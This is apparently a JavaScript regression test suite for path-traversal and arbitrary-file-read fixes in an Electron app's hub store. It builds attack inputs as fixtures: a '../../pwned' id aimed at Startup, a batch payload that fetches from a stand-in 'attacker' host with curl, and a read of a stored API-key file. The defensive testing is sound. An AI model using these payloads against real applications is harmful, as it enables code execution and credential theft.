// Regression tests for the two path-handling vulnerabilities found in the
// 2026-07-20 audit of electron/companion/hub-store.js:
//
//   1. hub:save joined the renderer-supplied item `id` straight into a
//      filesystem path, so a `..`-bearing id wrote attacker-controlled bytes
//      outside <userData>/companion-hub/images (e.g. into Startup).
//   2. hub:load read whatever absolute path a persisted `file://` ref named and
//      returned it to the renderer as a base64 data: URI (arbitrary file read,
//      including the endpoint key store).
//
// electron/ipc/validators.js states the renderer is untrusted, so both are
// reachable from renderer script. These tests encode that threat model.

import assert from "node:assert/strict";
import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";

import { createHubStore } from "../electron/companion/hub-store.js";

async function tmpUserData() {
  return await fs.mkdtemp(path.join(os.tmpdir(), "coop-hub-test-"));
}

const PNG_DATA_URI = "data:image/png;base64," + Buffer.from("fake-png-bytes").toString("base64");

test("save() does not let a traversing id escape the images directory", async () => {
  const userDataDir = await tmpUserData();
  const store = createHubStore({ userDataDir });

  const escapeTarget = path.join(userDataDir, "pwned.bat");
  const traversingId = "../../pwned";

  const res = await store.save([
    { id: traversingId, at: "2026-01-01", artifact: { kind: "image", title: "t", content: PNG_DATA_URI } },
  ]);
  assert.equal(res.ok, true);

  await assert.rejects(
    () => fs.access(escapeTarget),
    "a traversing id must not create a file outside companion-hub/images"
  );

  // The bytes must land inside the images dir under a derived, non-traversing name.
  const written = await fs.readdir(store.hubImagesDir);
  assert.equal(written.length, 1);
  assert.match(written[0], /^[a-f0-9]{32}\.png$/);
});

test("save() refuses to pick the on-disk extension from renderer-supplied MIME", async () => {
  const userDataDir = await tmpUserData();
  const store = createHubStore({ userDataDir });

  const batPayload = "data:a/bat;base64," + Buffer.from("@echo off\r\ncurl http://attacker/x\r\n").toString("base64");
  await store.save([
    { id: "x", at: "2026-01-01", artifact: { kind: "image", title: "t", content: batPayload } },
  ]);

  // Nothing should be written at all for a non-image MIME; it stays inline.
  const entries = await fs.readdir(store.hubImagesDir).catch(() => []);
  assert.deepEqual(entries.filter((e) => e.endsWith(".bat")), []);
});

test("load() will not read a file outside the images directory", async () => {
  const userDataDir = await tmpUserData();
  const store = createHubStore({ userDataDir });

  // Stand in for endpoints.json — the real exfiltration target named in the audit.
  const secretPath = path.join(userDataDir, "endpoints.json");
  const secret = JSON.stringify({ apiKey: "sk-super-secret" });
  await fs.writeFile(secretPath, secret, "utf8");

  // Write hub.json directly: this is exactly what a renderer round-trip produced.
  await fs.mkdir(path.dirname(store.hubFilePath), { recursive: true });
  await fs.writeFile(
    store.hubFilePath,
    JSON.stringify([
      { id: "x", at: "2026-01-01", artifact: { kind: "image", title: "t", content: "file://" + secretPath } },
    ]),
    "utf8"
  );

  const { items } = await store.load();
  assert.equal(items.length, 1);

  const content = items[0].artifact.content;
  assert.ok(!content.startsWith("data:"), "out-of-tree file must not be inlined as a data: URI");
  assert.ok(
    !content.includes(Buffer.from(secret).toString("base64")),
    "secret bytes must never reach the renderer"
  );
});

test("load() still inlines a legitimate image inside the images directory", async () => {
  const userDataDir = await tmpUserData();
  const store = createHubStore({ userDataDir });

  await store.save([
    { id: "legit", at: "2026-01-01", artifact: { kind: "image", title: "t", content: PNG_DATA_URI } },
  ]);

  const { items } = await store.load();
  assert.equal(items.length, 1);
  assert.equal(items[0].artifact.content, PNG_DATA_URI, "round-trip of a real image must still work");
});
